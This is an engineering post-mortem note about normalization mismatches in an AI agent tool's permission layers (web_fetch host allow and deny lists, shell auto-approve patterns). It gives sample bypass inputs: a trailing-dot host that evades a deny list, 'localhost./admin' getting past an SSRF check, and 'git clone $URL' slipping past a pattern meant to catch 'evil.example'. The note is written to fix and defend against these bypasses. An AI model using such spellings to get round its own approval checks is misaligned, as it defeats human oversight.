---
slug: canonicalize-once-before-every-matching-layer
hook: "When two layers match the same operand with different normalizations, promoting either one to an authorization decision turns the mismatch into a bypass — canonicalize once, before every layer."
topics: [permissions, security, authorization, normalization, go]
changes: [69, 70]
created: 2026-08-19
updated: 2026-08-20
promotion_state: candidate
promoted_to:
---

## Apply

A deny-list, an allow-list, and a reputation lookup that all key off "the host" (or "the path", or
"the command name") are only equivalent if they *spell the operand identically*. They rarely do —
one calls a stdlib accessor, another calls a local `normalize()`, and the two disagree on some edge
spelling nobody enumerated. While every layer merely **biases** a later decision, that disagreement
is a curiosity: the request still reaches the real gate. The moment you promote one of those
matchers to a **terminal authorization** — "this list means allow, with no further checks" — the
disagreement becomes a bypass, because the attacker only has to find the spelling that misses the
strict matcher and hits the permissive one.

Two rules:

1. **Canonicalize once, at the top, through a single shared function**, and pass the canonical form
   to every layer. Not "each layer normalizes carefully" — that is the state you are trying to
   leave; the layers drift apart on the next edit. One exported canonicalizer, one call site before
   the ladder, and the two spellings of the rule *cannot* diverge again.
2. **Re-audit every matcher whenever a hint is promoted to an authorization source.** The promotion
   is the change in kind. Ask explicitly: what was this data allowed to be sloppy about while it was
   only advisory? Where does the data come from, who can add to it, and what bounds it now? A
   popularity list that was fine as a bias hint may happily authorize paste sites and link
   shorteners once it decides. Subtract the dangerous shapes and **pin the promoted set in a test**,
   so a later data refresh that widens authorization fails the suite instead of shipping silently.

Corollary for list-shaped authorization: the admission criterion must be *the operator controls the
hostname namespace*, not *the operator is reputable*. Open-registration namespaces
(`*.github.io`, `*.readthedocs.io`) fail that test — anyone can register inside them — while
operator-minted subdomains (`*.wikipedia.org`) pass. State the criterion in the source next to the
list, or the next person re-adds the entry.

Related: [[auto-approve-task-implied-edits-classifier-context]] (what to auto-approve structurally),
[[fail-closed-guard-calibrate-benign-set]], [[containment-proof-needs-a-real-resolved-path]].

## War story

- 2026-08-19 (#69, PR #75) — Change 0069 promoted fuse's web_fetch known-good host seed from a
  classifier bias hint into a real auto-approve (`DecidedBy:"known-good"`, zero classifier calls).
  The whole-branch review's blocker was a live bypass the promotion itself created:
  `url.Hostname()` preserves a trailing root dot while `reputation.normalize` strips one, so
  `https://google.com./?q=…` **missed** the configured `fetch_deny` and **missed** `strongSeedMatch`
  (both exact matchers) while `reputation.KnownGood` **matched** — an allow against an explicitly
  configured deny, with no classifier call to catch it. The same gap put `http://localhost./admin`
  past the SSRF check. Pre-0069 that URL still reached the classifier, so nothing was exploitable;
  making the seed terminal is precisely what turned a normalization mismatch into an authorization
  bypass. Fixed by canonicalizing once through a shared `reputation.CanonicalHost` before every
  layer. The same review pass found the backing popularity CSV had silently changed category — a
  documented refresh procedure would have imported exfil-shaped hosts into an authorization source —
  and found `*.github.io`/`*.readthedocs.io` auto-approving from an open-registration namespace.
  Both were fixed with a hardcoded exfil-shape subtraction plus a test pinning the exact promoted
  set. Recorded architecturally as ADR-0048.
- 2026-08-19 (#70, PR #76) — Same shape, different operand class. The shell-parse widening kept an
  opaque arg's raw source text (`$URL`) in the glob subject `segmentSubject` builds — safe for the
  deny/ask consumers, which only tighten, but the **allow** consumer (`allSegmentsAllowed`) matched
  that subject against user `auto_approve` patterns. `path.Match`'s `*` does not cross `/`, and that
  slash boundary does real containment work in human-authored patterns — which collapses when the
  operand becomes one opaque token with no `/` in it: `auto_approve: ["bash:git *"]` correctly asked
  on `git clone https://evil.example/x` but **allowed** `git clone $URL` at the rules layer, before
  the egress boundary or the opaque-ask ever ran. Two layers reading the same operand under
  different normalizations (raw source text vs. what bash will expand), with one promoted to an
  authorization decision. Fixed by declining the pattern allow for any segment with an opaque arg,
  mirroring the existing `WriteTargets` decline — an unprovable operand cannot satisfy a pattern
  that scopes one.
